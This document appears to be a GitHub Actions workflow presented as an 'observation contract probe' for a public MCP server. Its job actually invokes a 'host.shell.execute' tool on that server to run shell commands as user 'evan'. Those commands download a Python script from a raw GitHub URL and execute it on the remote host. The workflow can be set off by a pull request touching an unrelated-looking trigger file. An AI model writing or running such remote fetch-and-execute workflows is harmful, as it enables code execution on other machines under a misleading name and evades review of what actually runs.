name: Cognilode public MCP CUX observation contract probe

on:
  workflow_dispatch:
  push:
    branches: [master]
    paths:
      - '.github/workflows/cognilode-public-mcp-cux-skills.yml'
      - '.github/recovery/loaded_adoption_preflight.py'
  pull_request:
    branches: [master]
    paths:
      - '.github/everything-revenue-ingress-trigger.txt'

permissions:
  contents: read

jobs:
  contracts:
    runs-on: ubuntu-latest
    timeout-minutes: 7
    steps:
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
      - run: python -m pip install --disable-pip-version-check 'mcp==1.29.0'
      - name: Execute existing selected-world adoption and loaded-generation verification
        shell: bash
        run: |
          python - <<'PY'
          import asyncio, traceback
          from mcp import ClientSession
          from mcp.client.streamable_http import streamable_http_client

          command = '''set -Eeuo pipefail
          work=$(mktemp -d /tmp/selected-world-adoption.XXXXXX)
          trap 'rm -rf "$work"' EXIT
          curl -fsSL --retry 2 --connect-timeout 10 https://raw.githubusercontent.com/evanbrown3000/sh1pt/1244ae36c7acb8ac372cab531e46d7683047d381/.github/recovery/loaded_adoption_preflight.py -o "$work/adopt.py"
          chmod 700 "$work/adopt.py"
          py=/home/evan/.local/share/live/worlds/v1/runtime/venv/bin/python
          test -x "$py"
          "$py" "$work/adopt.py"
          '''

          async def main():
              async with streamable_http_client('https://mcp.cognilode.com/mcp') as (read, write, _):
                  async with ClientSession(read, write) as session:
                      await session.initialize()
                      tools = await session.list_tools()
                      names = {tool.name for tool in tools.tools}
                      if 'multi_tool' not in names:
                          raise RuntimeError(f'multi_tool missing; tools={sorted(names)}')
                      try:
                          await session.call_tool('multi_tool', {
                              'operation': '__skill__',
                              'arguments': {'operation': 'host.shell.execute'},
                          })
                      except Exception:
                          pass
                      result = await session.call_tool('multi_tool', {
                          'operation': 'host.shell.execute',
                          'arguments': {
                              'command': command,
                              'cwd': '/home/evan',
                              'timeout_seconds': 180,
                              'max_output_bytes': 262144,
                              'host_user': 'evan',
                          },
                      })
                      failed = bool(getattr(result, 'isError', False))
                      for part in result.content:
                          text = getattr(part, 'text', '')
                          if text:
                              print(text)
                      if failed:
                          raise RuntimeError('host tool returned isError=true')

          try:
              asyncio.run(main())
          except BaseException:
              traceback.print_exc()
              raise
          PY
